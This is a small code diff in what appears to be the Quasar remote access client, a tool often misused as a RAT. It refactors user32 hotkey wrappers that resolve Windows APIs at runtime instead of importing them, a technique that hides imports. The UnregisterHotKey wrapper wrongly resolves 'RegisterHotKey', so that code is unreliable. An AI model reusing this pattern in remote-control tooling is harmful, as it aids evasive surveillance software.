@@ -29,7 +29,7 @@ namespace Quasar.Client.Utilities
         ///     If the function fails, the return value is zero. To get extended error information, call GetLastError.
         /// </returns>
         //[DllImport("user32.dll")]
-        public static int RegisterHotKey(IntPtr hwnd, int id, int fsModifiers, int vk) => ClientNatives.Lookup<RegisterHotKeyProc>("user32.dll", "RegisterHotKey")(hwnd, id, fsModifiers, vk);
+        public static int RegisterHotKey(IntPtr hwnd, int id, int fsModifiers, int vk) => Lookup<RegisterHotKeyProc>("user32.dll", "RegisterHotKey")(hwnd, id, fsModifiers, vk);
 
         public delegate bool UnregisterHotKeyProc(IntPtr hwnd, int id);
         /// <summary>
@@ -47,7 +47,7 @@ namespace Quasar.Client.Utilities
         ///     If the function fails, the return value is zero. To get extended error information, call GetLastError.
         /// </returns>
         //[DllImport("user32.dll")]
-        public static bool UnregisterHotKey(IntPtr hwnd, int id) => ClientNatives.Lookup<UnregisterHotKeyProc>("user32.dll", "RegisterHotKey")(hwnd, id);
+        public static bool UnregisterHotKey(IntPtr hwnd, int id) => Lookup<UnregisterHotKeyProc>("user32.dll", "RegisterHotKey")(hwnd, id);
 
     }
 }
